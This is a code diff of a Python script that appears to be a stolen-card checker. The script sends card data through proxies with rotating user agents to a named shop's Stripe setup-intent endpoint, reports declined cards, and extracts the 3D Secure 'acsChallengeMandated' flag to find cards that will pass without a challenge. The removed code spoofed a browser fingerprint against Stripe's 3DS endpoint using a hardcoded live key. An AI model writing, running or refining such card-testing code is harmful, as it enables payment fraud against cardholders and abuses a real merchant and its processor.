@@ -139,8 +139,8 @@ def get_payment_nonce(session, proxy_str):
     except Exception as e:
         return None, f"Payment nonce error: {str(e)}"
 
-def get_3ds_challenge_mandated(website_response, proxy_str):
-    """Extract acsChallengeMandated value from 3DS authentication response - EXACT RESPONSE ONLY"""
+def extract_3ds_challenge_mandated(website_response):
+    """Extract acsChallengeMandated value directly from the website response without making additional API calls"""
     try:
         if not website_response.get('success'):
             return 'ACSFAILED'
@@ -149,57 +149,68 @@ def get_3ds_challenge_mandated(website_response, proxy_str):
         if data_section.get('status') != 'requires_action':
             return 'ACSFAILED'
             
-        # Extract 3DS source directly from the website response
+        # Look for the 3DS data in the response
         next_action = data_section.get('next_action', {})
         if next_action.get('type') == 'use_stripe_sdk':
             use_stripe_sdk = next_action.get('use_stripe_sdk', {})
             three_d_secure_2_source = use_stripe_sdk.get('three_d_secure_2_source')
             
             if three_d_secure_2_source:
-                proxies = parse_proxy(proxy_str)
-                headers = stripe_headers.copy()
-                headers['user-agent'] = get_rotating_user_agent()
+                # The 3DS data might be embedded in the source itself or in the response
+                # Check if there's a redirect URL that contains the 3DS data
+                redirect_url = use_stripe_sdk.get('redirect', {}).get('url', '')
                 
-                # Call 3DS authenticate endpoint
-                auth_data = {
-                    'source': three_d_secure_2_source,
-                    'browser': '{"fingerprintAttempted":false,"fingerprintData":null,"challengeWindowSize":null,"threeDSCompInd":"Y","browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"en-GB","browserColorDepth":"24","browserScreenHeight":"864","browserScreenWidth":"1536","browserTZ":"-330","browserUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"}',
-                    'one_click_authn_device_support[hosted]': 'false',
-                    'one_click_authn_device_support[same_origin_frame]': 'false',
-                    'one_click_authn_device_support[spc_eligible]': 'true',
-                    'one_click_authn_device_support[webauthn_eligible]': 'true',
-                    'one_click_authn_device_support[publickey_credentials_get_allowed]': 'true',
-                    'key': 'pk_live_51KnIwCBqVauev2abKoSjNWm78cR1kpbtEdrt8H322BjXRXUvjZK2R8iAQEfHPEV9XNOCLmYVADzYkLd96PccE9HN00s4zyYumQ',
-                    '_stripe_version': '2024-06-20'
-                }
+                # Sometimes the 3DS data is in the redirect URL parameters
+                if 'acsChallengeMandated=' in redirect_url:
+                    # Extract from URL
+                    match = re.search(r'acsChallengeMandated=([YN])', redirect_url)
+                    if match:
+                        return match.group(1)
                 
-                auth_response = requests.post(
-                    'https://api.stripe.com/v1/3ds2/authenticate',
-                    headers=headers,
-                    data=auth_data,
-                    proxies=proxies,
-                    timeout=30
-                )
-                
-                if auth_response.status_code == 200:
-                    auth_data_response = auth_response.json()
-                    ares = auth_data_response.get('ares', {})
-                    acs_challenge = ares.get('acsChallengeMandated')
-                    
-                    # Return exact value from response, no auto N
+                # Check if there's direct 3DS data in the use_stripe_sdk object
+                three_ds_data = use_stripe_sdk.get('three_ds_data', {})
+                if three_ds_data:
+                    acs_challenge = three_ds_data.get('acsChallengeMandated')
                     if acs_challenge in ['Y', 'N']:
                         return acs_challenge
-                    else:
-                        return 'ACSFAILED'
-                else:
-                    return 'ACSFAILED'
+                
+                # Check for other possible locations
+                for key in ['acsChallengeMandated', 'challengeMandated', 'threeDSChallengeMandated']:
+                    value = use_stripe_sdk.get(key)
+                    if value in ['Y', 'N']:
+                        return value
+                    
+                    # Try nested lookup
+                    if isinstance(value, dict):
+                        nested_value = value.get('acsChallengeMandated') or value.get('challengeMandated')
+                        if nested_value in ['Y', 'N']:
+                            return nested_value
         
-        return 'ACSFAILED'
+        # If we can't find it in the obvious places, try to find it anywhere in the response
+        response_str = json.dumps(website_response)
+        pattern = r'["\']?acsChallengeMandated["\']?\s*[:=]\s*["\']?([YN])["\']?'
+        match = re.search(pattern, response_str, re.IGNORECASE)
+        if match:
+            return match.group(1)
+            
+        # Try alternative patterns
+        patterns = [
+            r'challengeMandated["\']?\s*[:=]\s*["\']?([YN])["\']?',
+            r'threeDSChallengeMandated["\']?\s*[:=]\s*["\']?([YN])["\']?',
+            r'acs_challenge_mandated["\']?\s*[:=]\s*["\']?([YN])["\']?'
+        ]
+        
+        for pattern in patterns:
+            match = re.search(pattern, response_str, re.IGNORECASE)
+            if match:
+                return match.group(1)
+        
+        return 'NOTFOUND'
         
     except Exception as e:
-        return 'ACSFAILED'
-        
-def get_final_message(website_response, proxy_str):
+        return f'ERROR: {str(e)[:50]}'
+
+def get_final_message(website_response, proxy_str=None):
     """Extract final user-friendly message from response with 3DS info"""
     try:
         if website_response.get('success'):
@@ -210,8 +221,11 @@ def get_final_message(website_response, proxy_str):
                 return "Payment method successfully added."
             elif status == 'requires_action':
                 # Get 3DS challenge mandated info directly from website response
-                acs_challenge_mandated = get_3ds_challenge_mandated(website_response, proxy_str)
-                return f"3D Secure verification required. | ACS Challenge: {acs_challenge_mandated}"
+                acs_challenge_mandated = extract_3ds_challenge_mandated(website_response)
+                if acs_challenge_mandated in ['Y', 'N']:
+                    return f"3D Secure verification required. | ACS Challenge: {acs_challenge_mandated}"
+                else:
+                    return f"3D Secure verification required. | ACS Challenge: {acs_challenge_mandated}"
             else:
                 return "Payment method status unknown."
         else:
@@ -427,6 +441,9 @@ DECLINED CC ❌
 
             response2 = session.post('https://firstcornershop.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', headers=headers2, data=data2, proxies=proxies, timeout=30)
             website_response = response2.json()
+            
+            # DEBUG: Print the raw response to see what we're getting
+            print(f"Raw response for debugging: {json.dumps(website_response, indent=2)}")
             
             # Get final message with 3DS info
             final_message = get_final_message(website_response, proxy_str)
